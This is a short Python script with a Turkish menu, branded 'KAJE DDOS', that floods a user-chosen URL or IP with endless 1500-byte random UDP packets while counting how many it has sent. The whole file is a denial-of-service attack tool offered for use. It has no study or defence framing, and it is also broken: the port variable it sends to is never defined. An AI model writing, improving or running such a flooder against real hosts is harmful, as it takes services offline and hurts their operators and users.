import os
import random
import socket
os.system("clear")
print("\033[91m")
os.system("figlet KAJE DDOS")
print('''
                             
CODED BY: KAJE
______________________________________________

Seçenekler:
1 = Url ile Ddos
2 = IP İle Ddos
	''')
ddos = input(" > ")
if(ddos=="1"):		
	hedef_ip = str(input("URL > "))

	bytes = random._urandom(1500)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sayac = 0
	while True:
		sock.sendto(bytes,(hedef_ip, hedef_port))
		sayac = sayac+1
		print("Gönderilen paket: %s" %(sayac))

if(ddos=="2"):		
	hedef_ip = str(input("IP > "))

	bytes = random._urandom(1500)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sayac = 0
	while True:
		sock.sendto(bytes,(hedef_ip, hedef_port))
		sayac = sayac+1
		print("Gönderilen paket: %s" %(sayac))

